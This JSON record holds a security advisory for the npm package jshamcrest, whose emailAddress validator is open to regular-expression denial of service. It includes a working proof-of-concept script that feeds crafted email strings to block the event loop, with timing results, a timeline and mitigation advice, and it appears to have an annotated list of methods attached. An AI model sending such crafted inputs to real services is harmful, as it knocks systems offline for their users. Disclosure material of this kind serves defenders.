{"description": "The `jshamcrest` package is affected by a regular expression denial of service vulnerability when certain types of user input are passed in to the emailAddress validator.\n\n\n## Proof of concept\n\n```js\nvar js = require('jshamcrest')\nvar emailAddress = new js.JsHamcrest.Matchers.emailAddress();\n\n\nvar genstr = function (len, chr) {\n    var result = \"\";\n    for (i=0; i<=len; i++) {\n        result = result + chr;\n    }\n\n    return result;\n}\n\n\nfor (i=1;i<=10000000;i=i+1) {\n    console.log(\"COUNT: \" + i);\n    var str = '66666666666666666666666666666@ffffffffffffffffffffffffffffffff.' + genstr(i, 'a') + '{'\n    console.log(\"LENGTH: \" + str.length);\n    var start = process.hrtime();\n    emailAddress.matches(str)\n\n    var end = process.hrtime(start);\n    console.log(end);\n}\n```\n\n### Results\nIt takes about 116 characters to get a 1.6 second event loop block.\n```\n[ 1, 633084590 ]\nCOUNT: 51\nLENGTH: 116\n```\n\n# Timeline\n- October 25, 2015 - Vulnerability Identified\n- October 25, 2015 - Maintainers notified (no response)\n\n\n## Recommendation\n\nThe `jshamcrest` package currently has no patched versions available.\n\nAt this time, the best available mitigation is to use an alternative module that is actively maintained and provides similar functionality. There are [multiple modules fitting this criteria available on npm.](https://www.npmjs.com/search?q=validator).", "methods": ["Used a regular expression denial of service (ReDoS) vulnerability in the `jshamcrest` package.", "Used a JavaScript script to exploit the ReDoS vulnerability.", "Used a large string to cause a denial of service in the `emailAddress` validator.", "Used a loop to repeatedly test the ReDoS vulnerability.", "Used a timer to measure the time it takes to cause a denial of service.", "Used a specific string length (116 characters) to cause a 1.6 second event loop block."]}
